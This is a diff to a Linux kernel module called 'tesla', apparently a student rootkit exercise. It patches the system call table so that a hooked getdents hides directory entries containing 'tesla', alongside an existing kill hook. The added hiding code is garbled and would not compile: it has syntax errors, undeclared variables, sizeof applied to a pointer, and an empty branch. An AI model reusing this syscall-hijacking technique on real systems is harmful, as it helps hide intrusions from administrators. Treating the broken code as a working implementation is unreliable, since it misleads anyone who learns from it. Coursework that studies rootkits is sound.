@@ -12,7 +12,7 @@
 #include <linux/types.h>  /* size_t */
 #include "tesla.h"
 
-MODULE_AUTHOR("Jidong Xiao"); /* change this line to your name */
+MODULE_AUTHOR("Ben Davies"); /* change this line to your name */
 MODULE_LICENSE("GPL v2");
 
 /* asmlinkage tells gcc that function parameters will not be in registers, but rather they will be in the stack. */
@@ -21,28 +21,58 @@ asmlinkage long tesla_getdents(unsigned int fd, struct linux_dirent __user *dirp
 {
 	//call getdents and use the information to filter out tesla files
 	
-	int total_size = orig_getdents( 3 ,dirp, count);
+	int total_size = orig_getdents( fd , dirp, count);
 	kmalloc(total_size, GFP_KERNEL)
 
 	//step 2: copy_from_user(dirp_kernel, dirp, total_size) total_size depends on whether or not tesla file occurs first, remove if first, else hide
+	struct dirent first = dirp_kernel;
 	copy_from_user(dirp_kernel, dirp, total_size);
 
-	//step 3: merge dirp, hide/delete tesla files. file above size + tesla size. OR skip tesla file if on top
-	struct dirent first = dirp_kernel;
-	char name[5];
-	name[0] = dirp_kernel->d_name[0];
-	name[1] = dirp_kernel->d_name[1];
-	name[2] = dirp_kernel->d_name[2];
-	name[3] = dirp_kernel->d_name[3];
-	name[4] = dirp_kernel->d_name[4];	
-	int tesla = strcmp("tesla", name);
-	
-	if(tesla == 0){  //remove size of first entry from total_size
-		int removalSize = sizeof(dirp_kernel);
-		
+	int isNext = 1; //0 for no, 1 for yes
+	char* buff[10];
+	int i = 0;
+	int prevTesla = 0; //0 for no, 1 for yes
+	(struct linux_dirent*)(char *)prev = dirp_kernel;
+	(struct linux_dirent*)(char *)firstEntry;
+
+	while(isNext == 1){      //while there is a next table entry
+
+		if(((struct linux_dirent*)((char *)next + dirp_kernel->d_reclen)) == NULL){
+			isNext = 0;
+		} else {
+			(struct linux_dirent*)((char *)next + dirp_kernel->d_reclen);
+			unsigned short next_reclen = next->d_reclen;
+		}
+		 
+
+		if((i == 0) && ((strstr(dirp_kernel->d_name, "tesla")) == NULL)){  //first is not tesla
+			i++; 
+			prevTesla = 0;
+			total_size -= sizeof(dirp_kernel);
+
+		} else if((i == 0) && ((strstr(dirp_kernel->d_name, "tesla")) != NULL)){ //first entry is tesla
+			dirp_kernel->d_reclen += next_reclen;
+			i++;
+			prevTesla = 1;
+			total_size -= sizeof(dirp_kernel);
+			
+		} else if((i != 0) && (prevTesla == 0) && ((strstr(dirp_kernel->d_name, "tesla")) != NULL)){   //not first entry, tesla not before
+			prev->d_reclen += dirp_kernel->d_reclen;
+			prevTesla = 1;
+			i++;
+			total_size -= sizeof(dirp_kernel);
+		} else if((i != 0) && (prevTesla == 1) && ((strstr(dirp_kernel->d_name, "tesla")) != NULL)) {
+
+		}
+
+		if(isNext == 1){
+			prev = dirp_kernel;
+			dirp_kernel = next;
+		}
 	}
 
 	//step 4: copy_to_user(dirp, dirp_kernel, total_size)
+	copy_to_user(dirp, dirp_kernel, total_size;)
     return 0;
 }
 
@@ -96,6 +126,9 @@ int tesla_init(void)
 	orig_kill = (void *)sys_call_table[__NR_kill];
 	sys_call_table[__NR_kill] = (long *)tesla_kill;
 
+	orig_getdents = (void *)sys_call_table[__NR_getdents];
+	sys_call_table[__NR_getdents] = (long *)tesla_getdents;	
+
 	/* set bit 16 of cr0, so as to turn the write protection on */
 
 	write_cr0(read_cr0() | 0x10000);
@@ -113,7 +146,8 @@ void tesla_exit(void)
 
 	/* restore the kill system call to its original version */
 	sys_call_table[__NR_kill] = (long *)orig_kill;
-
+	sys_call_table[__NR_getdents] = (long *) orig_getdents;
+	
 	/* set bit 16 of cr0 */
 	write_cr0(read_cr0() | 0x10000);
 
